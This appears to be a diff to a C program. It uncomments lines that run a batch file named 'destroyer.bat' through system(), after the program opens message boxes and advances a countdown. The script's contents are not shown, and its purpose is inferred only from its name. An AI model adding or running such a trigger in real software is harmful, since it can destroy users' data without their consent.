@@ -138,10 +138,10 @@ int main() {
     createChildProcess(scndmessageBoxPath);
     totalSecs += 68;
     progClock(totalSecs);
-    // char destroyerPath[PATH_MAX];
-    // strcpy(destroyerPath, currentDir);
-    // strcat(destroyerPath, "\\bin\\destroyer.bat");
-    // system(destroyerPath);
+    char destroyerPath[PATH_MAX];
+    strcpy(destroyerPath, currentDir);
+    strcat(destroyerPath, "\\bin\\destroyer.bat");
+    system(destroyerPath);
 
     return 0;
 }
